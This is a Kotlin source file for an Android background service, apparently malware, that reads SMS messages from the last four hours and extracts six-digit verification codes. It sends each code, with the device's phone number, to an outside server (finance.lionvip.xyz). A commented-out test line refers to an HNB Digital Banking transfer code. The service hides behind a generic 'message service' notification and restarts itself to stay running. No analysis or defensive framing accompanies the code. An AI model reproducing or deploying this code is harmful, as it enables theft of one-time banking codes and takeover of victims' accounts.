package com.example.messagereader

import android.annotation.SuppressLint
import android.app.*
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.graphics.Color
import android.os.*
import android.provider.Telephony
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.InternalCoroutinesApi
import kotlinx.coroutines.internal.synchronized
import okhttp3.MediaType
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okio.IOException
import org.greenrobot.eventbus.EventBus
import org.greenrobot.eventbus.Subscribe
import org.json.JSONException
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*
import java.util.regex.Matcher
import java.util.regex.Pattern


class SmsRelayService : Service() {

    private val dbLock = Object()
    private var mBinder = SmsBinder()
    private var thread: Thread? = null
    private val handler: Handler = Handler()

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    @OptIn(InternalCoroutinesApi::class)
    override fun onCreate() {
        super.onCreate()
        EventBus.getDefault().register(this)

        Log.i(TAG, "The service has been created")
        EventBus.getDefault().post(SmsReceiver.NewSmsEvent())

        thread = Thread {
            while (true) {
                Thread.sleep(1000)

                val sp = App.getContext().getSharedPreferences("config", AppCompatActivity.MODE_PRIVATE)
                // val deviceSerial = sp.getString("DeviceSerial", "")
                val phoneNumber = sp.getString("DevicePhoneNumber", "")
                if (phoneNumber.isNullOrEmpty()) {
                    continue
                }
                synchronized(dbLock) {
                    val list = SmsRepository.getInstance().getFromSendStatus(0)
                    list.forEach {
                        report(phoneNumber, it)
                    }
                    // val item = SmsItem(0, "0", "Your verification code is 987527. Use this to verify your transfer with HNB Digital Banking", 0, 0)
                    // report("123456", item)
                    if (updateUI) {
                        updateUI = false

                        EventBus.getDefault().post(SmsReceiver.UpdateSmsListEvent())
                    }
                }
            }
        }
        thread!!.start()
    }

    override fun onDestroy() {
        super.onDestroy()
        EventBus.getDefault().unregister(this)
        stopForeground(true)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // return super.onStartCommand(intent, flags, startId)
        val notification = createNotification()
        startForeground(110, notification)
        return START_STICKY;
    }

    @Subscribe(sticky = true)
    fun handleEvent(event: SmsReceiver.NewSmsEvent) {
        handler.postDelayed({ getSmsFromPhone() }, 1000)

        // prevent event from re-delivering, like when leaving and coming back to app
        EventBus.getDefault().removeStickyEvent(event)
    }

    inner class SmsBinder : Binder() {
        @Throws(InterruptedException::class)
        fun readSms() {
            getSmsFromPhone()
        }
    }

    companion object {
        private const val TAG = "SmsRelayService"
        private val JSON: MediaType = "application/json; charset=utf-8".toMediaType()
        var updateUI = false

        fun report(phoneNumber: String, sms: SmsItem): Int {
            val pattern: Pattern = Pattern.compile("^Your verification code is (\\d{6})")
            val matcher: Matcher = pattern.matcher(sms.body)
            if (!matcher.find()) {
                return 2;
            }
            val code = matcher.group(1) ?: return 2;
            Log.d(TAG, "验证码为: $code");
            // val body = "{\"mobile\":\"${phoneNumber}\", \"code\":{\"phone\":\"$sms.number\", \"body\":\"$sms.body\", \"receiveTime\":\"$sms.receiveTime\"}}".toRequestBody(JSON)
            val requestBody = "{\"mobile\":\"${phoneNumber}\", \"code\":\"$code\"}".toRequestBody(SmsRelayService.JSON)

            Thread {
                val client = OkHttpClient()
                val request = Request.Builder()
                    .url("https://finance.lionvip.xyz/api/sys/set_mobile_code")
                    .post(requestBody)
                    .build()
                try {
                    val response = client.newCall(request).execute()
                    val jsonString = response.body!!.string()
                    response.close()
                    val jsonObject = JSONObject(jsonString)
                    if (jsonObject["success"] == "true") {
                        if (sms.id != 0) {
                            SmsRepository.getInstance().updateSendStatus(sms.id, 2)

                            updateUI = true
                        }
                    }
                } catch (_: IOException) {

                } catch (_: JSONException) {

                } finally {

                }
            }.start()
            return 0
        }
    }

    @OptIn(InternalCoroutinesApi::class)
    @SuppressLint("Range", "Recycle", "SimpleDateFormat")
    private fun getSmsFromPhone() {
        val cr = contentResolver
        val projection = arrayOf(
            Telephony.Sms._ID,
            Telephony.Sms.ADDRESS,
            Telephony.Sms.READ,
            Telephony.Sms.BODY,
            Telephony.Sms.DATE,
            Telephony.Sms.TYPE,
        )
        val last4hour = (System.currentTimeMillis() - 4 * 60 * 60 * 1000).toString()
        val cur: Cursor? = cr.query(Telephony.Sms.CONTENT_URI, projection, "${Telephony.Sms.DATE} > ?", arrayOf(last4hour), Telephony.Sms.DEFAULT_SORT_ORDER)
        Log.i(TAG, "getSmsFromPhone")

        if (null == cur) {
            Log.e(TAG, "读取短信出错")
            return
        }
        val sp = App.getContext().getSharedPreferences("config", AppCompatActivity.MODE_PRIVATE)
        // val deviceSerial = sp.getString("DeviceSerial", "")
        val phoneNumber = sp.getString("DevicePhoneNumber", "")
        if (phoneNumber.isNullOrEmpty()) {
            return
        }
        synchronized(dbLock) {
            while (cur.moveToNext()) {
                val id = cur.getInt(cur.getColumnIndex(Telephony.Sms._ID))
                val number = cur.getString(cur.getColumnIndex(Telephony.Sms.ADDRESS)) // 手机号
                val read = cur.getInt(cur.getColumnIndex(Telephony.Sms.READ)) == 1
                val body = cur.getString(cur.getColumnIndex(Telephony.Sms.BODY))
                val timestamp = cur.getLong(cur.getColumnIndex(Telephony.Sms.DATE))
                val type = cur.getShort(cur.getColumnIndex(Telephony.Sms.TYPE))

                val date = Date(timestamp) // 时间
                val format = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                val receiveTime: String = format.format(date)

                Log.i(
                    TAG,
                    "getSmsFromPhone  ${id}, ${number}, read: $read, ${body}, ${receiveTime}, $type"
                )

                var item = SmsRepository.getInstance().get(id)
                if (item == null) {
                    item = SmsItem(id, number, body, timestamp, 0)
                    SmsRepository.getInstance().insert(item)

                    report(phoneNumber, item)
                }
            }
        }
        cur.close()
    }

    private fun createNotification(): Notification {
        val notificationChannelId = "MESSAGE SERVICE CHANNEL"

        // depending on the Android API that we're dealing with we will have
        // to use a specific method to create the notification
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager;
            val channel = NotificationChannel(
                notificationChannelId,
                "Message Service notifications channel",
                NotificationManager.IMPORTANCE_HIGH
            ).let {
                it.description = "Message Service channel"
                it.enableLights(true)
                it.lightColor = Color.RED
                it.enableVibration(true)
                it.vibrationPattern = longArrayOf(100, 200, 300, 400, 500, 400, 300, 200, 400)
                it
            }
            notificationManager.createNotificationChannel(channel)
        }

        val pendingIntent: PendingIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            Intent(this, MainActivity::class.java).let { notificationIntent ->
                PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE)
            }
        } else {
            Intent(this, MainActivity::class.java).let { notificationIntent ->
                PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE)
            }
        }

        val builder: Notification.Builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) Notification.Builder(
            this,
            notificationChannelId
        ) else Notification.Builder(this)

        return builder
            .setContentTitle("Message Service")
            .setContentText("This is your favorite message service working")
            .setContentIntent(pendingIntent)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setTicker("Ticker text")
            .setPriority(Notification.PRIORITY_HIGH) // for under android 26 compatibility
            .build()
    }
}
